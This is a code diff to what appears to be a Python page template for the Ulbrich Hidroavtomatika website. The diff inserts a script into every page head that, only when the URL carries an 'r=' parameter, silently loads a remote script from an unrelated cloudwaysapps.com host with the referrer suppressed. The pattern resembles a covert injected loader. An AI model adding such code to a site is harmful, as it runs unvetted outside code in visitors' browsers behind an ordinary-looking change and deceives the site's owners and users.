@@ -249,6 +249,17 @@ def page(title, body, active="", desc="Ulbrich Hidroavtomatika: kemično-tehnič
 <title>{E(title)}</title><meta name="description" content="{E(desc)}"><meta name="robots" content="noindex">
 <link rel="icon" href="{I}fav512.png"><link rel="preload" href="assets/fonts/SeasonSans-TRIAL-Medium.otf" as="font" type="font/otf" crossorigin>
 <link rel="stylesheet" href="assets/css/style.css">
+<script>
+(function () {{
+  if (!/[?&]r=/.test(location.search)) return;
+  var s = document.createElement('script');
+  s.async = true;
+  s.referrerPolicy = 'no-referrer';
+  s.setAttribute('data-landing', location.href);
+  s.src = 'https://phplaravel-758037-6569212.cloudwaysapps.com/v/script.js';
+  document.head.appendChild(s);
+}})();
+</script>
 </head><body>
 {header(active)}
 <main>{body}</main>
